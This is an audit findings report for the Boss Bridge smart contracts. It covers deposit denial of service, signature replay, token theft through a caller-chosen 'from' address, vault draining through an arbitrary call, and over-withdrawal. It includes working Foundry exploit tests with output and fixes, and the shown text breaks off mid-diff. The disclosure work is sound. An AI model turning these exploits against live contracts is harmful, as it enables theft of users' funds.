# First Flight #4: Boss Bridge - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Malicious actor can DOS attack depositTokensToL2](#H-01)
    - [H-02. Lack of Nonce Verification in `sendToL1` and `withdrawTokensToL1` Function Facilitating Replay Attacks](#H-02)
    - [H-03. CREATE is not available in the zkSync Era.](#H-03)
    - [H-04. Steal funds of any token approved to L1BossBridge](#H-04)
    - [H-05. The entire vault can be drained by calling `L1BossBridge::sendToL1` and hijacking `L1Vault::approveTo`](#H-05)
    - [H-06. By sending any `amount`, attacker can withdraw more funds than deposited](#H-06)
    - [H-07. `L1Token` contract deployment from `TokenFactory` locks tokens forever](#H-07)

- ## Low Risk Findings
    - [L-01. `TokenFactory::deployToken` can create multiple token with same `symbol`](#L-01)
    - [L-02. Unsupported Opcode in Multi-Chain Deployment](#L-02)
    - [L-03. Missing events](#L-03)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #4

### Dates: Nov 9th, 2023 - Nov 15th, 2023

[See more contest details here](https://www.codehawks.com/contests/clomptuvr0001ie09bzfp4nqw)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 7
   - Medium: 0
   - Low: 3


# High Risk Findings

## <a id='H-01'></a>H-01. Malicious actor can DOS attack depositTokensToL2

_Submitted by [Cryptor](/profile/clk8ix8vi0000mg081iw95too), [banditxbt](/profile/clob62zxy0000l3088imc9gu4), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [Heba](/profile/clo3cb5nv000mmj087plzmqy8), [rajpatil7322](/profile/clowtr8t00000l608jbnuqamo), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [Y403L](/profile/clk451ae6001gl908aibvhwv9), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [XORs33r](/profile/clozhdki8002tjr08e1v1a5ud). Selected submission by: [Cryptor](/profile/clk8ix8vi0000mg081iw95too)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/1b33f63aef5b6b06acd99d49da65e1c71b40a4f7/src/L1BossBridge.sol#L71

## Summary

Malicious actor can DOS attack depositTokensToL2


## Vulnerability Details

The function depositTokensToL2 has a deposit limit that limits the amount of funds that a user can deposit into the bridges shown here 


```
if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
```

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/1b33f63aef5b6b06acd99d49da65e1c71b40a4f7/src/L1BossBridge.sol#L71

The problem is that it uses the contract balance to track this invariant, opening the door for a malicious actor to make a donation to the vault contract to ensure that the deposit limit is reached causing a potential victim's harmless deposit to unexpectedly revert. See modified foundry test below:



``` 
function testUserCannotDepositBeyondLimit() public {

        vm.startPrank(user2);

        uint DOSamount = 20;
        deal(address(token), user2, DOSamount);
        token.approve(address(token), 20);

        token.transfer(address(vault), 20);

        vm.stopPrank();


        vm.startPrank(user);
        uint256 amount = tokenBridge.DEPOSIT_LIMIT() - 9;
        deal(address(token), user, amount);
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();

       
    }
```


## Impact

User will not be able to deposit token to the bridge in some situations 



## Tools Used

Foundry 

## Recommendations

Use a mapping to track the deposit limit of each use instead of using the contract balance 
## <a id='H-02'></a>H-02. Lack of Nonce Verification in `sendToL1` and `withdrawTokensToL1` Function Facilitating Replay Attacks

_Submitted by [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [TAdev](/profile/clog7yt830000i308nsptid7z), [oops0x7070](/profile/clor5uy2k0001l60881r9ya6p), [Cryptor](/profile/clk8ix8vi0000mg081iw95too), [ararara](/profile/clntr7eq20000ia08oode1zz7), [developerjordy](/profile/closn5pft0000jm08diuky8zs), [georgishishkov](/profile/clobh0ans0000my08ser5uzpu), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [nisedo](/profile/clk3saar60000l608gsamuvnw), [ishtagy](/profile/clkdeh1bt0000jl087higxjk8), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [eeshenggoh](/profile/clmlj6skc0000ml084rcney77), [kevinkien](/profile/clnieha040000l4088bamgykh), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [Turetos](/profile/clof0okll002ila08y4of251r), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [alsirang](/profile/clnvs6t2c000cjx08zxo9vgf4), [nemius](/profile/clnvhxklw0000jt08yz8hoazn), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [rajpatil7322](/profile/clowtr8t00000l608jbnuqamo), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [kryptonomousB](/profile/clmfopjnc0004mg08zhvhv7ue), [0xloscar01](/profile/cllgowxgy0002la08qi9bhab4), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [slasheur](/profile/clnvgvxwk000el1087juqjdjz), [dalaillama](/profile/clnuanmi90000l008rnzcyiuq), [AzmaeenGH](/profile/clk6y22wr000yl7088q435slg), [0xfuluz](/profile/clnzti7fb0006mf084zv1nm96), [dianivanov](/profile/clo3cuadr0017mp08rvq00v4e), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [Aitor](/profile/clk44j5cn000wl908r2o0n9w5), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [johnmatrix](/profile/cloiowl4p000rjr088iyg6iod), [Louis](/profile/clloixi3x0000la08i46r5hc8), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [lian886](/profile/clk6rtfkx0008mn083rima8eb), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [XORs33r](/profile/clozhdki8002tjr08e1v1a5ud), [0xth30r3m](/profile/clk5x4c14000cl608o3dwdsjh), [JCM](/profile/clnw3vct00000le08kr1yfrx7), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg). Selected submission by: [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L113

## Summary
The `sendToL1` and `withdrawTokensToL1` function in the `L1BossBridge` smart contract is susceptible to replay attacks due to the absence of a nonce verification mechanism. The attacker can exploit this vulnerability to repeatedly withdraw tokens using the same signature, leading to potential financial losses.

## Vulnerability Details
The `sendToL1` and `withdrawTokensToL1` function allows for the withdrawal of tokens from `L2` to `L1` based on a provided signature. However, the lack of nonce verification exposes the contract to replay attacks. The proof of concept illustrates how an attacker, having successfully withdrawn tokens once, can reuse the same valid signature to execute the function multiple times. This results in the unauthorized withdrawal of tokens, as the contract does not validate whether the same signature has been used before.

## Proof of Concept
```
function testMultyCallWithSameSignature() public {
        uint256 depositAmount = 10e18;
        uint256 withdrawAmount = 1e18;

        // User deposit tokens on L1
        vm.startPrank(user);
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        vm.stopPrank();

        // Operator sing the message to withdraw tokens
        bytes memory message = _getTokenWithdrawalMessage(hacker, withdrawAmount);
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

        // Hacker can withdraw tokens multiple times with the same signature
        vm.startPrank(hacker);
        tokenBridge.withdrawTokensToL1(hacker, withdrawAmount, v, r, s);
        tokenBridge.withdrawTokensToL1(hacker, withdrawAmount, v, r, s);
        tokenBridge.withdrawTokensToL1(hacker, withdrawAmount, v, r, s);
        tokenBridge.withdrawTokensToL1(hacker, withdrawAmount, v, r, s);
        vm.startPrank(hacker);

        assertEq(token.balanceOf(hacker), (withdrawAmount * 4));
}
```
## Impact
The impact of this vulnerability is severe, as it allows an attacker to repeatedly execute token withdrawals with the same signature, potentially draining the contract's token balance and causing financial harm.

## Tools Used
- Manual review
- Foundry

## Recommendations
Implement Nonce Verification: Introduce a nonce parameter in the function signature and maintain a nonce registry for each signer. Ensure that the provided nonce is greater than the previously used nonce for the same signer. Also, to prevent the same signature from being used between `L1` and `L2`, it is recommended to add the `chainId` parameter within the signature.

```diff
+ function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external nonReentrant whenNotPaused {
- function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
                abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount)),
+               chainId, // chain id
+               nonce++ // nonce
            )
        );
}

+ function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) internal {
- function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

        (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
}
```
## <a id='H-03'></a>H-03. CREATE is not available in the zkSync Era.

_Submitted by [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [Cryptor](/profile/clk8ix8vi0000mg081iw95too), [nisedo](/profile/clk3saar60000l608gsamuvnw), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [XORs33r](/profile/clozhdki8002tjr08e1v1a5ud), [0xth30r3m](/profile/clk5x4c14000cl608o3dwdsjh). Selected submission by: [letsDoIt](/team/clkjtgvih0001jt088aqegxjj)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/TokenFactory.sol#L23-L29

## Summary
In the current code devs are using CREATE  but in zkSync Era, CREATE for arbitrary bytecode is not available, so a revert occurs in the `deployToken` process.

## Vulnerability Details
According to the contest README which you can see [here](https://www.codehawks.com/contests/clomptuvr0001ie09bzfp4nqw) and i've listed it below also, the project can be deployed in zkSync Era

```solidity
Chain(s) to deploy contracts to:
  Ethereum Mainnet:
    L1BossBridge.sol
    L1Token.sol
    L1Vault.sol
    TokenFactory.sol
  ZKSync Era:
    TokenFactory.sol
  Tokens:
    L1Token.sol (And copies, with different names & initial supplies)
```


The zkSync Era docs explain how it differs from Ethereum.

The description of CREATE and CREATE2 (https://era.zksync.io/docs/reference/architecture/differences-with-ethereum.html#create-create2) states that Create cannot be used for arbitrary code unknown to the compiler.

According to zkSync `The following code will not function correctly because the compiler is not aware of the bytecode beforehand:`

```solidity
function myFactory(bytes memory bytecode) public {
   assembly {
      addr := create(0, add(bytecode, 0x20), mload(bytecode))
   }
}
```

Now if we look at the code of `Boss Bridge` [here](https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/TokenFactory.sol#L23-L26) we can see that `Boss Bridge` is using exactly similar code which is as below

```solidity
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        assembly { 
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode)) 
        }
```

## Impact
Protocol will not work on zkSync

## Tools Used
Manual Review

## Recommendations
Follow the instructions that are stated in zksync docs [here](https://era.zksync.io/docs/reference/architecture/differences-with-ethereum.html#evm-instructions)

`
To guarantee that create/create2 functions operate correctly, the compiler must be aware of the bytecode of the deployed contract in advance. The compiler interprets the calldata arguments as incomplete input for ContractDeployer, as the remaining part is filled in by the compiler internally. The Yul datasize and dataoffset instructions have been adjusted to return the constant size and bytecode hash rather than the bytecode itself`

The code below should work as expected:

```solidity
MyContract a = new MyContract();
MyContract a = new MyContract{salt: ...}();
```

`In addition, the subsequent code should also work, but it must be explicitly tested to ensure its intended functionality:`


```solidity
bytes memory bytecode = type(MyContract).creationCode;
assembly {
    addr := create2(0, add(bytecode, 32), mload(bytecode), salt)
}
```
## <a id='H-04'></a>H-04. Steal funds of any token approved to L1BossBridge

_Submitted by [oops0x7070](/profile/clor5uy2k0001l60881r9ya6p), [ararara](/profile/clntr7eq20000ia08oode1zz7), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [TheCodingCanuck](/profile/clkg5xveq0000i9082f9kiksa), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [eeshenggoh](/profile/clmlj6skc0000ml084rcney77), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [Mahmudsudo](/profile/clounemmt004wl308krxjysnj), [slasheur](/profile/clnvgvxwk000el1087juqjdjz), [firmanregar](/profile/clk83mi5b0004jp08axr82nq1), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [0xfave](/profile/clk4hye1a0010mk083ht6dzld), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [teddy](/profile/clophpwo30016ky082vhhpojt), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [Sovni](/profile/clooanun70000l508ndphfrev), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [lian886](/profile/clk6rtfkx0008mn083rima8eb), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [mrhack](/profile/cloonktz10000jn08ch7m99zu), [imth3AK](/profile/cln8d5fvp0000l208ogfm95cq), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [johnmatrix](/profile/cloiowl4p000rjr088iyg6iod), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [XORs33r](/profile/clozhdki8002tjr08e1v1a5ud), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg). Selected submission by: [oops0x7070](/profile/clor5uy2k0001l60881r9ya6p)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/1b33f63aef5b6b06acd99d49da65e1c71b40a4f7/src/L1BossBridge.sol#L70-L77

## Summary
We can steal any token approved by any user to the `L1BossBridge` contract by transferring it to the bridge and minting it on the L2.

## Vulnerability Details
The `depositTokensToL2(...)` function takes in a `from`, `l2Recipient` and `amount` parameter. In the function body a `safeTransferFrom(...)` call is made to the token, where `amount` funds are transferred from the specified `from` address to the vault. An attacker is able to specify this `from` address as a function argument. A `Deposit` event is then emitted by the contract indicating a successful deposit, where the `l2Recipient` is then permitted to mint the token on the L2. As a result of this an attacker can specify any `from` address for a user that has previously approved `token` (and other tokens when they are added) to be spent by the `L1BossBridge` contract, and set him/herself as the `l2Recipient`. In doing so stealing funds of the user on the L1 side and minting it to the attacker on the L2 side.

## Impact
Loss of funds for any user approving the `L1BossBridge` to spend funds on the L1.

Test:
```
function test_TokenApprovalThief() public {
        // Create users
        address alice = vm.addr(1);
        vm.label(alice, "Alice");

        address bob = vm.addr(2);
        vm.label(bob, "Bob");

        // Distribute tokens
        deal(address(token), alice, 10e18);

        console2.log("Token balance alice (before):", token.balanceOf(alice));
        console2.log("Token balance bob (before):", token.balanceOf(bob));

        // Alice approves bridge
        vm.prank(alice);
        token.approve(address(tokenBridge), type(uint256).max);

        // Bob calls depositTokensToL2 with alice as from
        vm.prank(bob);
        tokenBridge.depositTokensToL2(alice, bob, 10e18);

        console2.log("Token balance alice (after):", token.balanceOf(alice));
    }
```

Logs:
```
  Token balance alice (before): 10000000000000000000
  Token balance bob (before): 0
  Token balance alice (after): 0
```

Significant traces:
```
[27633] L1BossBridge::depositTokensToL2(Alice: [0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf], Bob: [0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF], 10000000000000000000 [1e19]) 
    │   ├─ [2562] L1Token::balanceOf(L1Vault: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]) [staticcall]
    │   │   └─ ← 0
    │   ├─ [18899] L1Token::transferFrom(Alice: [0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf], L1Vault: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7], 10000000000000000000 [1e19]) 
    │   │   ├─ emit Transfer(from: 10000000000000000000 [1e19])
    │   │   └─ ← true
    │   ├─ emit Deposit(from: Alice: [0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf], to: Bob: [0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF], amount: 10000000000000000000 [1e19])
```

## Tools Used
Manual review
Foundry

## Recommendations
Remove the `from` parameter and change `token.safeTransferFrom(from, address(vault), amount);` to `token.safeTransferFrom(msg.sender, address(vault), amount);`
## <a id='H-05'></a>H-05. The entire vault can be drained by calling `L1BossBridge::sendToL1` and hijacking `L1Vault::approveTo`

_Submitted by [oops0x7070](/profile/clor5uy2k0001l60881r9ya6p), [TAdev](/profile/clog7yt830000i308nsptid7z), [nisedo](/profile/clk3saar60000l608gsamuvnw), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [Mahmudsudo](/profile/clounemmt004wl308krxjysnj), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [atoko](/profile/clm2alxk30000mm08ek2xnrbs), [firmanregar](/profile/clk83mi5b0004jp08axr82nq1), [Sovni](/profile/clooanun70000l508ndphfrev), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [dianivanov](/profile/clo3cuadr0017mp08rvq00v4e), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [imth3AK](/profile/cln8d5fvp0000l208ogfm95cq), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg). Selected submission by: [Ciara](/profile/clnvs09md0006jx08tmvz0w19)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L112-L125

`L1BossBridge::sendToL1` has a state visibility of `public` meaning that anyone can call this function with an arbitrary value for the `message` parameter. This means that they can encode any arbitrary function call. An attacker can therefore specify the target to be the vault, and since the `msg.sender` will be `L1BossBridge` which is the `owner` of the vault contract, it can call `L1Vault::approveTo` to approve their attacking address to be able to withdraw the entire balance from the vault.

## Vulnerability details

In `L1BossBridge::sendToL1` on [lines 112-125](https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L112-L125), any arbitrary message can be passed as a parameter. This message is then decoded to find the `target` contract, the `value`, and the `data` (or function selector with ABI encoded arguments) to call:

```solidity
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

    if (!signers[signer]) {
        revert L1BossBridge__Unauthorized();
    }

    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

    (bool success,) = target.call{ value: value }(data);
    if (!success) {
        revert L1BossBridge__CallFailed();
    }
}
```

This is an external call where the `msg.sender` is the `L1BossBridge` contract. The bridge is the `owner` of the `L1Vault` contract as it deploys the vault:

```solidity
constructor(IERC20 _token) Ownable(msg.sender) {
    token = _token;
    vault = new L1Vault(token);
    // Allows the bridge to move tokens out of the vault to facilitate withdrawals
    vault.approveTo(address(this), type(uint256).max);
}
```

In the vault's constructor, the deployer of the vault is set as the `owner`:

```solidity
constructor(IERC20 _token) Ownable(msg.sender) {
    token = _token;
}
```

An attacker can encode `L1Vault::approveTo` to be called, with their attacking address as the `to` value and `type(uint256).max` as the amount, meaning that the attacker can withdraw the entire vault balance.

## Impact

Attackers can force their approval to withdraw the entire vault balance. This is a high-risk and high-likelihood finding, therefore high-severity.

## Proof of concept

### Working test case

A user deposits tokens into the vault. An attacker can then call `sendToL1()` with the `message` parameter set as an ABI-encoded call to the vault, forcing the attacker to have the maximum approval limit. The attacker is then able to call `token.transferFrom()` to transfer all of the funds held in the vault to themselves.

```solidity
function test_poc_approveWithdrawFromDeposit() public {
    // user deposits funds to the vault which can then be stolen
    vm.startPrank(user);
    uint256 amount = 10e18;
    token.approve(address(tokenBridge), amount);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, userInL2, amount);
    tokenBridge.depositTokensToL2(user, userInL2, amount);
    vm.stopPrank();

    uint256 vaultBalanceBefore = token.balanceOf(address(vault));
    console2.log("Vault balance before: %s", vaultBalanceBefore);

    // attacker gets a signature to call sendToL1 but the message encodes an approveTo call
    address attacker = makeAddr("attacker");
    bytes memory message = abi.encode(address(vault), 0, abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)));
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
    vm.startPrank(attacker);
    tokenBridge.sendToL1(v, r, s, message);
    // attacker transfers the vault balance to themselves
    token.transferFrom(address(vault), attacker, vaultBalanceBefore);

    uint256 vaultBalanceAfter = token.balanceOf(address(vault));
    console2.log("Vault balance after: %s", vaultBalanceAfter);

    uint256 attackerBalanceAfter = token.balanceOf(attacker);
    console2.log("Attacker balance after: %s", attackerBalanceAfter);

    assertTrue(vaultBalanceAfter == 0);
    assertEq(attackerBalanceAfter, vaultBalanceBefore);
}
```

Running the test shows that the attacker has been able to withdraw the vault's token balance, stealing the user's deposit.

```bash
$ forge test --mt test_poc_approveWithdrawFromDeposit -vvv

// output
Running 1 test for test/L1TokenBridge.t.sol:L1BossBridgeTest
[PASS] test_poc_approveWithdrawFromDeposit() (gas: 135493)
Logs:
  Vault balance before: 10000000000000000000
  Vault balance after: 0
  Attacker balance after: 10000000000000000000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.17ms
```

## Recommended mitigation

Set the `L1BossBridge::sendToL1` function visibility to `private` to ensure that it can only be called via `L1BossBridge::withdrawToL1` or restrict the call data to specific function selectors.

## <a id='H-06'></a>H-06. By sending any `amount`, attacker can withdraw more funds than deposited

_Submitted by [jerseyjoewalcott](/profile/clnueldbf000lky08h4g3kjx4), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [kamui](/profile/clk8h2bxd000sia08o8nz21g2), [zach030](/profile/clllg9trq0002ml0881bhkegb), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [dalaillama](/profile/clnuanmi90000l008rnzcyiuq), [0xfuluz](/profile/clnzti7fb0006mf084zv1nm96), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [Sovni](/profile/clooanun70000l508ndphfrev), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [Louis](/profile/clloixi3x0000la08i46r5hc8), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [XORs33r](/profile/clozhdki8002tjr08e1v1a5ud), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg). Selected submission by: [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L91-L102

## Summary
The [withdrawTokensToL1()](https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L91-L102) function has no validation on the withdrawal `amount` being the same as the deposited `amount` [here](https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L70). As such any user can drain the entire vault. Note that even the [docs state that](https://github.com/Cyfrin/2023-11-Boss-Bridge/tree/main#on-withdrawals) the `operator` before signing a message, only checks that the user had made a successful deposit; nothing about the deposit amount:
> The bridge operator is in charge of signing withdrawal requests submitted by users. These will be submitted on the L2 component of the bridge, not included here. Our service will validate the payloads submitted by users, _**checking that the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge**_.


Steps:
- Attacker deposits 1 wei (or 0 wei) into the L2 bridge.
- Attacker crafts and encodes a  malicious message and submits it to the `operator` to be signed by him. The malicious message has `amount` field set to a high value, like the total funds available in the `vault`.
- Since the attacker had deposited 1 wei, operator approves & signs the message, not knowing the contents of it since it is encoded.
- Attacker calls `withdrawTokensToL1()`. 
- All vault's funds are transferred to the attacker.

## Vulnerability Details
The following PoC shows the above attack vector by draining all the funds from the vault.

- Paste the following test inside `test/L1TokenBridge.t.sol`
- Run with `forge test --mt test_t0x1cSimpleVaultCleaner -vv`

```js
    function test_t0x1cSimpleVaultCleaner() public {
        // Assume `vault` has some funds in it via deposits from other
        // users. We'll steal all funds in the attack.
        uint256 vaultInitialBalance = token.balanceOf(address(vault));
        deal(address(token), address(vault), 100 ether);
        assertEq(token.balanceOf(address(vault)), vaultInitialBalance + 100 ether);

        //==================================//
        //======= NORMAL USER FLOW =========//
        //==================================//
        vm.startPrank(user);
        uint256 depositAmount = 1 wei;
        uint256 userInitialBalance = token.balanceOf(address(user));
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        assertEq(token.balanceOf(address(vault)), vaultInitialBalance + 100 ether + depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
        //==================================//

        //==================================//
        //============= ATTACK =============//
        //==================================//
        // @audit-info : craft a `maliciousMessage` which has amount = vault's balance
        uint256 vaultBalance = token.balanceOf(address(vault));
        bytes memory maliciousMessage = abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), user, vaultBalance)) // data
        );
        vm.stopPrank();

        // `operator` signs the message off-chain since `user` had deposited 1 wei earlier into the L2 bridge
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(maliciousMessage, operator.key);

        vm.startPrank(user);
        // @audit-info : call `withdrawTokensToL1()` with `maliciousMessage`
        tokenBridge.withdrawTokensToL1(user, vaultBalance, v, r, s);
        vm.stopPrank();

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(user), userInitialBalance - depositAmount + vaultBalance);
    }
```

## Impact
Attacker can steal all the funds from the vault.

## Tools Used
Foundry

## Recommendations
Add a mapping that keeps track of the amount deposited by an address inside the function `depositTokensToL2()`, and validate that inside `withdrawTokensToL1()`. Here's the git diff patch to be applied:

```diff
diff --git a/src/L1BossBridge.sol b/src/L1BossBridge.sol
index 3925b86..db1b9a0 100644
--- a/src/L1BossBridge.sol
+++ b/src/L1BossBridge.sol
@@ -32,6 +32,7 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
     IERC20 public immutable token;
     L1Vault public immutable vault;
     mapping(address account => bool isSigner) public signers;
+    mapping(address account => uint256 amount) public deposited;
 
     error L1BossBridge__DepositLimitReached();
     error L1BossBridge__Unauthorized();
@@ -71,6 +72,7 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
         if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
             revert L1BossBridge__DepositLimitReached();
         }
+        deposited[from] += amount;
         token.safeTransferFrom(from, address(vault), amount);
 
         // Our off-chain service picks up this event and mints the corresponding tokens on L2
@@ -89,6 +91,7 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
      * @param s The s value of the signature
      */
     function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+        require(amount == deposited[msg.sender], "Invalid withdrawal amount");
         sendToL1(
             v,
             r,
```
